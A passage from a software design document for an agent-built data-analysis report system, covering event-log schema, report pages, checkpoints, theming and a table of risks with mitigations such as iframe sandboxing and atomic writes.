{"id": "e-041", "ts": "14:02:11", "kind": "cell_output", "plan_step_id": "s2", "status": "active",
 "payload": {"asset": "sha256:9c1f…", "cell_id": "a3be", "src_hash": "77d0…",
             "caption": "xG for/against, group stage"}}
{"id": "e-057", "ts": "14:06:40", "kind": "mlflow_run", "plan_step_id": "s5", "status": "active",
 "payload": {"model": "xgboost", "params": {"max_depth": 6, "eta": 0.1}, "metrics": {"auc": 0.87},
             "repro": {"data_digest": "8d41…", "seed": 42, "env_freeze": "31ac…"}, "run_id": "9f2c…"}}
{"id": "e-063", "ts": "14:09:03", "kind": "note", "page": "decisions", "supersedes": "e-041",
 "payload": {"md": "Dropped the linear baseline — residuals show clear position interaction
              effects. Proceeding with the GBM.", "reason": "baseline abandoned"}}
{"id": "e-064", "ts": "14:09:04", "kind": "plan_update", "payload": {"plan_step_id": "s5", "status": "completed"}}
```

**The schema decision everything hangs on (D6):** entries are immutable content captures with **supersede edges**. A superseded entry renders collapsed with its reason in the body — in analysis, dead ends are findings; delete them and you delete the answer to "did you try gradient boosting?".

**Ownership and attribution:**
- Report keyed to the **session/plan** (plans and MLflow experiments already are), with source notebook as a facet per entry.
- MLflow runs attribute to plan steps via a `plan_step_id` run tag, injected the same way `proposal_id` already is.
- Step identity travels by **id, not name** — `update_plan` silently forks a step on rename today (`_normalize_steps` falls back to name matching).

### Pages

| Page | Compiled from | Reads as |
|---|---|---|
| Overview | Latest note per page + headline metrics + plan state | Executive summary, always current |
| Analyses | Cell figures + tables + notes, grouped by plan step; re-executed cells supersede earlier output | The report body |
| Models | MLflow runs — params, metrics, repro block, chosen vs. rejected, linked rationale | Comparison matrix pinned to a declared primary metric and baseline row, with deltas; mismatched eval-data digests badged "not directly comparable" |
| Decisions | Plan decisions + user feedback + direction-change notes | The "why" trail — what was decided, on what evidence |
| Log | Every entry, append-only, filterable by kind — superseded included | The flight recorder |

### Live view vs. checkpoints

The live view has no version — it *is* the current state, rendered from the manifest on request. Checkpoints (cut at plan-step completion, label = step name) are **materialized**: compiled once, frozen, figures embedded as data URIs — because the workspace files the manifest references are overwritten by the very next cell run. Live = render-on-serve; history = frozen self-contained snapshots.

Size: the 5 MB cap applies to exported flattenings, not the store — assets live content-addressed beside the manifest and pages compose per-page. The Log virtualizes past a few hundred entries.

Trust: compile stamps "changed since you last viewed" badges from a last-seen timestamp; every entry gets a stable anchor (`#e-063`) for deep links.

## 10. Theme system

- The artifacts/visualization/dashboarding skills mandate every color/type decision go through `--dc-*` custom properties (`--dc-bg`, `--dc-ink`, `--dc-accent`, `--dc-good`, …).
- The serve-time wrapper injects the active token sheet — light and dark values — ahead of the artifact's own CSS.
- Theme sync runtime: embedding surface posts `{theme}` on load and toggle; runtime stamps `data-theme` on the artifact root.
- Pluggability later is exactly one file: a per-project token sheet chosen in settings, applied retroactively to every existing artifact because wrapping happens on serve (D1).

## 11. Risks & mitigations

| Risk | Mitigation |
|---|---|
| Navigation-based exfiltration (CSP doesn't govern navigation) | Sandbox omits `allow-popups`/`allow-top-navigation`; host tears down embeds that navigate off-origin; honest classification: **contained, not blocked** |
| Store corruption under concurrent publishes | Atomic writes, per-artifact lock, disk-derived version numbers, `base_version` CAS; explicitly not the plans-store pattern |
| Living report misattribution | Content snapshots + nbformat cell ids + `plan_step_id` tags; step identity by id, not name |
| Checkpoint rot (references to overwritten workspace files) | Checkpoints materialized at cut time with embedded assets |
| Report bloat | Content-addressed dedup, per-page composition, log virtualization; export-time flattening owns the 5 MB budget |
| Generated HTML is subtly broken and nobody looks | `dataclaw-browser` screenshot self-check before the plan step closes |
| Agent ping-pongs on validation failures | Machine-readable rejection reasons; skill contract: fix-and-retry once, then surface to the user |
